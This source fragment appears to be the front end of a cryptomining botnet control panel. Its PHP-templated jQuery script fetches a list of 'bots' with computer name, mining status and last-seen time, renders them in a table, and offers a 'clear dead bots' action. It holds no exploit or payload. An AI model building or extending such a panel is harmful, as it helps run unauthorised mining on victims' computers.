<script>
$.post( "<?php echo $APIURL;?>?get=bots&username=<?php echo $USERNAME;?>", function( data ) {
    console.log(data.records);
    createTable(data.records,[
        'id',
        'computername',
        'miningstatus',
        
        'status',
        'lastresponse',
        ], ['ID',"Username","Mining Status","Status","Last Seen"]);
        $('#table table').DataTable();
}); 




function clearDeadBots(){
    $.post('<?php echo $APIURL;?>?edit=cleardeadbots&username=<?php echo $USERNAME;?>', function(data) {
        toastr.success('Bots Cleared');
        location.reload();
        //setTimeout(function(){     $("#table tbody").empty() }, 500);
    
    });
}




function createTable(objectArray, fields, fieldTitles) {
  let body = document.getElementById('table');
  let tbl = document.createElement('table');
  let thead = document.createElement('thead');
  let thr = document.createElement('tr');
  fieldTitles.forEach((fieldTitle) => {
    let th = document.createElement('th');
    th.appendChild(document.createTextNode(fieldTitle));
    thr.appendChild(th);
  });
  thead.appendChild(thr);
  tbl.appendChild(thead);
    var i = 0;
  let tbdy = document.createElement('tbody');
  let tr = document.createElement('tr');
  $.each(objectArray  , function( key, value ) {
       // console.log( key + ": " + value );
    let tr = document.createElement('tr');
    fields.forEach((field) => {
        var td = document.createElement('td');
        if(field == "lastresponse"){
            td.appendChild(document.createTextNode(timeSince(value[field])));
        }else{
            td.appendChild(document.createTextNode(value[field]));
        }

        tr.appendChild(td);
        i++;
    });

    tbdy.appendChild(tr);    

});

  tbl.appendChild(tbdy);
  body.appendChild(tbl)
  return tbl;
}


</script>